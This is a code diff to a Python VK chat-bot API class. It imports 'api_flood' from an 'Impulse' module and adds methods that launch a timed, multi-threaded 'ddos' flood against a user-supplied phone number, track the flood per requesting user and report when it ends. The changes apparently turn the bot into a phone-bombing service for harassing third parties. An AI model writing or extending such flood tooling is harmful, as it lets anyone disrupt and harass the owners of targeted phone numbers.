@@ -1,5 +1,8 @@
-﻿import random
+﻿import random, threading
 from connect import Connect
+from threading import Thread
+from Impulse.impulse import api_flood, threads_ddos
+from parse_configuration import get_value_by_key
 
 class API:
     api = Connect.VK
@@ -30,3 +33,19 @@ class API:
     @staticmethod
     def groups_isMember(user_id):
         return API.api.method('groups.isMember', { 'group_id': API.longpoll.group_id, 'user_id': user_id })
+
+    @staticmethod
+    def call_ddos_number(user_id, number, time, threads):
+        threads_ddos[user_id] = Thread(target = api_flood, args = (number, time, threads))
+        threads_ddos[user_id].start()
+        clear_thread = threading.Timer(time, API.end_ddos_attack, [user_id, number])
+        clear_thread.start()
+
+    @staticmethod
+    def end_ddos_attack(user_id, number):
+        del threads_ddos[user_id]
+        API.messages_send(user_id, get_value_by_key('BOT_ANSWER', 'BOT_DDOS_ENDED').format(number))
+
+    @staticmethod 
+    def is_already_user_id_ddos(user_id):
+        return user_id in threads_ddos
